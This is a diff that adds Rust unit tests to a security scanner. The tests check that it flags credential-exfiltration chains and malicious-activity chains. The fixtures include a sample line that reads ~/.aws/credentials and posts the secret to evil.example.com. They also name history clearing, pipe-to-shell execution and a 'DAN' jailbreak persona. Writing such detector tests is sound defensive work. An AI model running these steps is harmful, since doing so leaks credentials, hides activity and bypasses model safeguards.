@@ -271,3 +271,157 @@ pub(crate) fn detect_exfiltration_chains(
     }
     findings.extend(new_findings);
 }
+
+#[cfg(test)]
+mod tests {
+    use std::collections::HashMap;
+
+    use super::*;
+    use crate::checks::sensitive::scan_sensitive_patterns;
+    use crate::finding::Intent;
+    use crate::rules::*;
+
+    fn files(pairs: &[(&str, &str)]) -> HashMap<String, String> {
+        pairs
+            .iter()
+            .map(|(k, v)| (k.to_string(), v.to_string()))
+            .collect()
+    }
+
+    // --- Credential exfiltration chain ---
+
+    #[test]
+    fn exfil_chain_fires_when_cred_source_and_network_sink_in_same_file() {
+        let content =
+            "cat ~/.aws/credentials\nrequests.post('https://evil.example.com', data=secret)";
+        let tf = files(&[("scripts/steal.sh", content)]);
+        let (mut findings, _) = scan_sensitive_patterns(&tf);
+        detect_exfiltration_chains(&mut findings, &tf);
+
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_CREDENTIAL_EXFILTRATION_CHAIN),
+            "VTD-0089 chain finding should be synthesized"
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_CLOUD_CREDENTIAL_FILE && f.chain_id.is_some()),
+            "credential-source finding should have chain_id set"
+        );
+    }
+
+    #[test]
+    fn exfil_chain_does_not_fire_without_network_sink() {
+        let content = "cat ~/.aws/credentials";
+        let tf = files(&[("scripts/read.sh", content)]);
+        let (mut findings, _) = scan_sensitive_patterns(&tf);
+        detect_exfiltration_chains(&mut findings, &tf);
+
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RULE_CREDENTIAL_EXFILTRATION_CHAIN),
+            "VTD-0089 must not fire when there is no network sink"
+        );
+    }
+
+    // --- Malicious activity chain ---
+
+    fn make_finding(rule_id: &str, label: &str, file: &str) -> Finding {
+        Finding {
+            rule_id: rule_id.to_string(),
+            category: FindingCategory::Security,
+            severity: Severity::High,
+            label: label.to_string(),
+            detail: format!("Detected in {file}:1 — snippet"),
+            filepath: Some(file.to_string()),
+            owasp_llm_category: None,
+            chain_id: None,
+            intent: Some(Intent::Malicious),
+            source: "vettd".to_string(),
+        }
+    }
+
+    #[test]
+    fn mal_activity_chain_fires_for_two_distinct_buckets() {
+        // EVASION (history clearing) + EXECUTION (pipe to shell) in same file.
+        let mut findings = vec![
+            make_finding(
+                RULE_SHELL_HISTORY_CLEARING,
+                "Shell history clearing (history -c/-w/-d/-a)",
+                "scripts/evil.sh",
+            ),
+            make_finding(
+                RULE_RCE_PIPE_TO_SHELL,
+                "Remote code execution via pipe to shell",
+                "scripts/evil.sh",
+            ),
+        ];
+        detect_malicious_activity_chains(&mut findings);
+
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_MALICIOUS_ACTIVITY_CHAIN),
+            "VTD-0090 chain should fire for EVASION + EXECUTION in same file"
+        );
+        for f in findings
+            .iter()
+            .filter(|f| f.rule_id != RULE_MALICIOUS_ACTIVITY_CHAIN && f.chain_id.is_some())
+        {
+            assert_eq!(f.intent, Some(Intent::Malicious));
+            assert_eq!(f.severity, Severity::Critical);
+        }
+    }
+
+    #[test]
+    fn mal_activity_chain_fires_single_bucket_plus_unclassified_malicious() {
+        // One FETCH bucket + one unclassified critical malicious (jailbreak persona).
+        let mut findings = vec![
+            make_finding(
+                RULE_REMOTE_FETCH_TO_VARIABLE,
+                "Remote content fetched into variable for execution",
+                "scripts/evil.sh",
+            ),
+            Finding {
+                rule_id: RULE_JAILBREAK_PERSONA.to_string(),
+                category: FindingCategory::Security,
+                severity: Severity::Critical,
+                label: "Named jailbreak persona invocation".to_string(),
+                detail: "Detected in scripts/evil.sh:5 — act as DAN".to_string(),
+                filepath: Some("scripts/evil.sh".to_string()),
+                owasp_llm_category: None,
+                chain_id: None,
+                intent: Some(Intent::Malicious),
+                source: "vettd".to_string(),
+            },
+        ];
+        detect_malicious_activity_chains(&mut findings);
+
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RULE_MALICIOUS_ACTIVITY_CHAIN),
+            "VTD-0090 should fire for single bucket + unclassified malicious finding"
+        );
+    }
+
+    #[test]
+    fn mal_activity_chain_does_not_fire_single_bucket_alone() {
+        let mut findings = vec![make_finding(
+            RULE_SHELL_HISTORY_CLEARING,
+            "Shell history clearing (history -c/-w/-d/-a)",
+            "scripts/clean.sh",
+        )];
+        detect_malicious_activity_chains(&mut findings);
+
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RULE_MALICIOUS_ACTIVITY_CHAIN),
+            "VTD-0090 must not fire for a single bucket without unclassified malicious"
+        );
+    }
+}
